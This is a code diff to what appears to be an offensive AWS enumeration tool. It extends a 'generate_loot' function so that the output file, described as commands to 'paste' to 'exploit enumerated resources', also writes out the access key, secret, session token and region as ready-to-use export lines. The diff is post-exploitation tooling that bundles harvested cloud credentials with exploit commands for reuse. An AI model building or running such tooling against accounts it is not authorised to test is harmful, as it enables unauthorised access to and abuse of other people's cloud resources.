@@ -1480,12 +1480,23 @@ def check_role_trusts(key_id, secret, token, region, timeout, current_arn=None, 
     return result
 
 
-def generate_loot(result, out_dir, account_id):
+def generate_loot(result, out_dir, account_id, key_id=None, secret=None, token=None, region=None):
     """Generate ready-to-execute commands for all enumerated resources."""
     loot_lines = []
     loot_lines.append(f"# AWS Loot — Account {account_id}")
     loot_lines.append(f"# Generated: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}")
     loot_lines.append(f"# Paste these commands to exploit enumerated resources\n")
+
+    if key_id and secret:
+        cred_label = result.get("credential_used", {}).get("label", "")
+        loot_lines.append(f"# ── Credentials in use{f' ({cred_label})' if cred_label else ''} ──────────────")
+        loot_lines.append(f"export AWS_ACCESS_KEY_ID='{key_id}'")
+        loot_lines.append(f"export AWS_SECRET_ACCESS_KEY='{secret}'")
+        if token:
+            loot_lines.append(f"export AWS_SESSION_TOKEN='{token}'")
+        if region:
+            loot_lines.append(f"export AWS_DEFAULT_REGION='{region}'")
+        loot_lines.append("")
 
     # S3 buckets
     s3 = result.get("s3", {})
@@ -2448,7 +2459,7 @@ def enumerate_credential(key_id, secret, token, args, extra_accounts):
 
     # [16] Loot generation
     print(f"{ts()} [16] Generating loot...", flush=True)
-    loot_path = generate_loot(result, out_dir, account_id)
+    loot_path = generate_loot(result, out_dir, account_id, key_id, secret, token, region)
     print(f"{ts()}   ✓ Loot file → {loot_path}", flush=True)
 
     return result
